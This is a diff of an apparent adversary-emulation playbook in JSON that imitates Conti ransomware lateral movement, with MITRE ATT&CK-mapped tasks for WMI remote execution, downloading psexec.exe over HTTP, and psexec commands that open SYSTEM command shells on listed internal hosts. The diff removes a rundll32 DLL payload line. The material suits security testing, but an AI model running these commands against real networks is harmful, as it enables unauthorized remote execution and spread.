@@ -5,47 +5,50 @@
     {
       "name": "Conti Ransomware Emulation - Lateral Movement -  Remote code execution with WMI",
       "enabled": true,
-      "task_sleep": 3,
+      "playbook_sleep": 5,
       "tasks": [
         {
           "technique_id": "T1047",
           "tactic": "lateral movement",
           "technique_name": "Windows Management Instrumentation",
           "variation": 1,
-          "host_target_type": 2,
-          "host_target_total": 5,
-          "payload":"rundll32.exe C:\\ProgramData\\2.dll StartW"
+          "host_target_type": 1,
+          "host_targets": [
+            "192.168.1.211",
+            "192.168.1.183"
+          ],
+          "task_sleep": 5,
+          "command": "calc.exe"
         }
       ]
     },
     {
       "name": "Conti Ransomware Emulation - Lateral Movement - Remote code execution with PsExec",
       "enabled": true,
-      "task_sleep": 3,
+      "playbook_sleep": 5,
       "tasks": [
         {
           "technique_id": "T1105",
           "technique_name": "Ingress Tool Transfer",
           "variation": 1,
-          "url": "http://10.0.1.14/psexec.exe",
+          "url": "http://100.1.1.169:8080/psexec.exe",
           "task_sleep": 5
         },
         {
           "technique_id": "T1059.003",
-          "command": "psexec.exe -accepteula -d -s \\\\10.0.1.18 C:\\windows\\system32\\cmd.exe",
+          "command": "psexec.exe -accepteula -d -s \\\\192.168.1.183 C:\\windows\\system32\\cmd.exe",
           "technique_name": "Command and Scripting Interpreter: Windows Command Shell"
         },
         {
           "technique_id": "T1059.003",
-          "command": "psexec.exe -accepteula -d -s \\\\10.0.1.19 C:\\windows\\system32\\cmd.exe",
+          "command": "psexec.exe -accepteula -d -s \\\\192.168.1.184 C:\\windows\\system32\\cmd.exe",
           "technique_name": "Command and Scripting Interpreter: Windows Command Shell"
         },
         {
           "technique_id": "T1059.003",
-          "command": "psexec.exe -accepteula -d -s \\\\10.0.1.20 C:\\windows\\system32\\cmd.exe",
+          "command": "psexec.exe -accepteula -d -s \\\\192.168.1.185 C:\\windows\\system32\\cmd.exe",
           "technique_name": "Command and Scripting Interpreter: Windows Command Shell"
         }
-        
       ]
     }
   ]
